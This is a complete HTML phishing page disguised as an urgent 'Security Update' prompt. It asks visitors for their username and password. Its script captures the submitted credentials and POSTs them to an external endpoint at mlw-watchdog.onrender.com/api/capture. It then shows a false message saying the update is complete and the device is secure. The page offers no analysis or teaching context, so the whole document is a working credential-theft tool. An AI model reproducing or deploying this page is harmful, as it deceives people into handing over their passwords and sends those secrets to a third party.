<!DOCTYPE html>
<html>
<head>
    <title>Security Update</title>
    <style>
        body{font-family:system-ui;background:#000;color:#0f0;text-align:center;padding:50px;}
        .box{max-width:400px;margin:auto;background:#111;padding:30px;border-radius:20px;}
        button{background:#0f0;color:#000;padding:15px;border:none;border-radius:10px;cursor:pointer;}
        input{width:100%;padding:10px;margin:10px 0;background:#222;color:#0f0;border:1px solid #0f0;}
    </style>
</head>
<body>
<div class="box">
    <h2>🔒 Security Update Required</h2>
    <p>Your device needs an urgent security patch.</p>
    <form id="captureForm">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Install Update</button>
    </form>
    <div id="result"></div>
</div>
<script>
    document.getElementById('captureForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        const data = {
            username: this.username.value,
            password: this.password.value
        };
        await fetch('https://mlw-watchdog.onrender.com/api/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({data: JSON.stringify(data)})
        });
        document.getElementById('result').innerHTML = '<p>✅ Update complete. Your device is secure.</p>';
        this.reset();
    });
</script>
</body>
</html>
